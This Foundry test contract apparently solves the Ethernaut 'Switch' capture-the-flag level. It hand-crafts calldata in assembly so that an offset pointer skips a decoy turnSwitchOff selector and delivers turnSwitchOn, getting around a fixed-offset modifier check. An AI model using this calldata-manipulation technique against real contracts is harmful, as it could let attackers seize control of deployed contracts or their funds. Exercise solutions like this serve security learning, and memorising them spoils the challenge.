// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract SwitchTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xb6793dA57738f247cf8EA28d1b18C6E560B3903C);
  }

  function testExploit() public {
    bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
    bytes32 offSelectorData = bytes32(bytes4(keccak256("turnSwitchOff()")));
    bytes32 onSelectorData = bytes32(bytes4(keccak256("turnSwitchOn()")));

    bytes memory switchCalldata = new bytes(4 + 5 * 32);
    assembly {
        mstore(add(switchCalldata, 0x20), flipSelector)
        // calldata tells the EVM: "The bytes variable is in 0x60 bytes forward"
        mstore(add(switchCalldata, 0x24), 0x0000000000000000000000000000000000000000000000000000000000000060)
        // length of the bytes data (that we are not using in this exploit) but for the modifier
        mstore(add(switchCalldata, 0x44), 0x0000000000000000000000000000000000000000000000000000000000000004)
        mstore(add(switchCalldata, 0x64), offSelectorData)
        // length of the actual bytes data we are using
        mstore(add(switchCalldata, 0x84), 0x0000000000000000000000000000000000000000000000000000000000000004)
        mstore(add(switchCalldata, 0xa4), onSelectorData)
    }

    (bool success,) = challengeAddress.call(switchCalldata);
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
